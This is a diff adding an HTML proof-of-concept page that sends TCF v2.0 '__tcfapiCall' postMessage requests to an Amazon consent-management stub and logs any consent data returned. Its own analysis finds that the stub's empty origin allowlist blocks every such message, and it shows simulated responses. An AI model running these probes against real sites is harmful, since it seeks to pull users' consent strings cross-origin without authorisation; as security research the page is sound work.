@@ -1,0 +1,220 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>TCF v2.0 CMP Stub - postMessage Protocol PoC</title>
+    <style>
+        body { font-family: monospace; background: #1a1a2e; color: #0f0; padding: 20px; }
+        h1 { color: #e94560; }
+        h2 { color: #f5a623; }
+        .log { background: #16213e; border: 1px solid #0f3460; padding: 10px; margin: 5px 0; white-space: pre-wrap; word-break: break-all; }
+        .error { color: #e94560; }
+        .success { color: #0f0; }
+        .info { color: #00d2ff; }
+        .warn { color: #f5a623; }
+        #controls { margin: 20px 0; }
+        button { background: #0f3460; color: #0f0; border: 1px solid #0f0; padding: 10px 20px; cursor: pointer; margin: 5px; font-family: monospace; }
+        button:hover { background: #16213e; }
+    </style>
+</head>
+<body>
+    <h1>TCF v2.0 CMP Stub - postMessage PoC</h1>
+
+    <h2>Analysis Summary</h2>
+    <div class="log info">
+This PoC targets the Amazon PRIVCONAssets-stub (11J1WJh9jNL.js).
+
+KEY FINDING: The stub initializes an origin allowlist as an EMPTY array ([]).
+Every postMessage is checked against this allowlist via:
+    if (-1 === d.indexOf(e.origin)) return void b(a, "ccJsPostMessageRequestUnauthorized", 1)
+
+Since the array is never populated in the stub, ALL cross-origin messages are REJECTED.
+The wildcard postMessage(c, "*") response path is UNREACHABLE dead code in the stub.
+
+The full CMP (loaded later) presumably populates this allowlist and may expose
+the wildcard postMessage vulnerability with actual consent data (TC strings, etc.).
+
+This PoC demonstrates the TCF protocol and what WOULD be disclosed if the
+allowlist were populated or if the origin check were bypassed.
+    </div>
+
+    <div id="controls">
+        <button onclick="sendPing()">Send __tcfapiCall "ping"</button>
+        <button onclick="sendGetTCData()">Send __tcfapiCall "getTCData"</button>
+        <button onclick="sendAddEventListener()">Send __tcfapiCall "addEventListener"</button>
+        <button onclick="directApiCall()">Direct __tcfapi() call (same-origin only)</button>
+        <button onclick="clearLog()">Clear Log</button>
+    </div>
+
+    <h2>Message Log</h2>
+    <div id="output"></div>
+
+    <!--
+        NOTE: Loading an Amazon page in an iframe will likely be blocked by
+        X-Frame-Options or CSP frame-ancestors. This is expected.
+        In a real scenario, the attacker would need the victim page to be
+        frameable, or use a window.open() approach instead.
+    -->
+    <iframe id="target" style="display:none;" sandbox="allow-scripts allow-same-origin"></iframe>
+
+    <script>
+        var callIdCounter = 0;
+        var pendingCalls = {};
+
+        function log(msg, cls) {
+            var div = document.createElement('div');
+            div.className = 'log ' + (cls || '');
+            div.textContent = '[' + new Date().toISOString() + '] ' + msg;
+            document.getElementById('output').prepend(div);
+        }
+
+        function clearLog() {
+            document.getElementById('output').innerHTML = '';
+        }
+
+        // Listen for __tcfapiReturn responses
+        window.addEventListener('message', function(event) {
+            log('RECEIVED postMessage from origin: ' + event.origin, 'info');
+            log('Raw data: ' + (typeof event.data === 'string' ? event.data : JSON.stringify(event.data, null, 2)), 'info');
+
+            var data = typeof event.data === 'string' ? JSON.parse(event.data) : event.data;
+
+            if (data && data.__tcfapiReturn) {
+                var ret = data.__tcfapiReturn;
+                log('__tcfapiReturn received:', 'success');
+                log('  callId: ' + ret.callId, 'success');
+                log('  success: ' + ret.success, 'success');
+                log('  returnValue: ' + JSON.stringify(ret.returnValue, null, 4), 'success');
+
+                // Analyze what data is disclosed
+                if (ret.returnValue) {
+                    var rv = ret.returnValue;
+                    log('--- DATA DISCLOSED ---', 'warn');
+                    if (rv.gdprApplies !== undefined) log('  gdprApplies: ' + rv.gdprApplies + ' (reveals GDPR jurisdiction)', 'warn');
+                    if (rv.cmpLoaded !== undefined) log('  cmpLoaded: ' + rv.cmpLoaded, 'warn');
+                    if (rv.cmpStatus) log('  cmpStatus: ' + rv.cmpStatus, 'warn');
+                    if (rv.displayStatus) log('  displayStatus: ' + rv.displayStatus, 'warn');
+                    if (rv.apiVersion) log('  apiVersion: ' + rv.apiVersion, 'warn');
+                    // These would appear if the full CMP responds:
+                    if (rv.tcString) log('  tcString: ' + rv.tcString + ' (CONSENT STRING DISCLOSED)', 'error');
+                    if (rv.tcfPolicyVersion) log('  tcfPolicyVersion: ' + rv.tcfPolicyVersion, 'error');
+                    if (rv.cmpId) log('  cmpId: ' + rv.cmpId, 'error');
+                    if (rv.vendorConsents) log('  vendorConsents: ' + JSON.stringify(rv.vendorConsents) + ' (VENDOR CONSENT DATA)', 'error');
+                    if (rv.purposeConsents) log('  purposeConsents: ' + JSON.stringify(rv.purposeConsents) + ' (PURPOSE CONSENT DATA)', 'error');
+                    log('--- END DISCLOSED DATA ---', 'warn');
+                }
+            }
+        });
+
+        // Construct a __tcfapiCall postMessage
+        function makeTcfApiCall(command, version, parameter) {
+            var callId = 'poc_call_' + (++callIdCounter);
+            return {
+                __tcfapiCall: {
+                    command: command,
+                    version: version || 2,
+                    callId: callId,
+                    parameter: parameter || null
+                }
+            };
+        }
+
+        function getTargetWindow() {
+            var iframe = document.getElementById('target');
+            if (iframe && iframe.contentWindow) {
+                return iframe.contentWindow;
+            }
+            log('No target window available. In a real attack, this would target a window/iframe hosting the Amazon TCF stub.', 'error');
+            return null;
+        }
+
+        function sendPing() {
+            log('=== Sending __tcfapiCall: ping (version 2) ===', 'info');
+            var msg = makeTcfApiCall('ping', 2);
+            log('Outbound message: ' + JSON.stringify(msg, null, 2), 'info');
+
+            var target = getTargetWindow();
+            if (target) {
+                // Send both as string and object to cover both code paths
+                target.postMessage(JSON.stringify(msg), '*');
+                log('Sent as JSON string to target iframe', 'info');
+            }
+
+            log('NOTE: The stub will reject this because our origin is not in the empty allowlist [].', 'warn');
+            log('The stub logs counter: ccJsPostMessageRequestUnauthorized', 'warn');
+
+            // Simulate what the response WOULD look like if allowlist check passed:
+            log('--- SIMULATED RESPONSE (what would be returned if allowlist permitted) ---', 'info');
+            var simulatedResponse = {
+                __tcfapiReturn: {
+                    returnValue: {
+                        gdprApplies: true,
+                        cmpLoaded: false,
+                        cmpStatus: "stub",
+                        displayStatus: "hidden",
+                        apiVersion: "2.0"
+                    },
+                    success: true,
+                    callId: msg.__tcfapiCall.callId
+                }
+            };
+            log(JSON.stringify(simulatedResponse, null, 4), 'success');
+        }
+
+        function sendGetTCData() {
+            log('=== Sending __tcfapiCall: getTCData (version 2) ===', 'info');
+            var msg = makeTcfApiCall('getTCData', 2);
+            log('Outbound message: ' + JSON.stringify(msg, null, 2), 'info');
+
+            var target = getTargetWindow();
+            if (target) {
+                target.postMessage(JSON.stringify(msg), '*');
+                log('Sent to target iframe', 'info');
+            }
+
+            log('NOTE: Even if allowlist check passed, the STUB queues this command.', 'warn');
+            log('The stub only handles "ping" directly. getTCData is pushed to a queue', 'warn');
+            log('and would only be processed once the full CMP loads.', 'warn');
+            log('If the full CMP responds, it would include:', 'info');
+            log('  - tcString (the IAB TC consent string encoding all user choices)', 'info');
+            log('  - gdprApplies, cmpId, cmpVersion, tcfPolicyVersion', 'info');
+            log('  - purpose.consents, purpose.legitimateInterests', 'info');
+            log('  - vendor.consents, vendor.legitimateInterests', 'info');
+            log('  - specialFeatureOptins', 'info');
+        }
+
+        function sendAddEventListener() {
+            log('=== Sending __tcfapiCall: addEventListener (version 2) ===', 'info');
+            var msg = makeTcfApiCall('addEventListener', 2);
+            log('Outbound message: ' + JSON.stringify(msg, null, 2), 'info');
+
+            var target = getTargetWindow();
+            if (target) {
+                target.postMessage(JSON.stringify(msg), '*');
+                log('Sent to target iframe', 'info');
+            }
+
+            log('NOTE: Also queued by stub, not processed until full CMP loads.', 'warn');
+        }
+
+        function directApiCall() {
+            log('=== Attempting direct window.__tcfapi() call ===', 'info');
+            if (typeof window.__tcfapi === 'function') {
+                window.__tcfapi('ping', 2, function(pingData) {
+                    log('Direct __tcfapi ping response: ' + JSON.stringify(pingData, null, 4), 'success');
+                });
+            } else {
+                log('window.__tcfapi not available (expected -- it is on the Amazon page, not here)', 'warn');
+            }
+        }
+
+        // On load, explain the situation
+        log('PoC loaded. The Amazon TCF stub (11J1WJh9jNL.js) has these defenses:', 'info');
+        log('  1. Origin allowlist check: var a = []  (empty, blocks ALL origins)', 'info');
+        log('  2. X-Frame-Options / CSP likely prevents framing Amazon pages', 'info');
+        log('  3. Only "ping" command returns data; all others are queued', 'info');
+        log('', 'info');
+        log('The postMessage(c, "*") wildcard is present but UNREACHABLE in stub form.', 'warn');
+        log('It becomes relevant when the full CMP populates the allowlist.', 'warn');
+    </script>
+</body>
+</html>
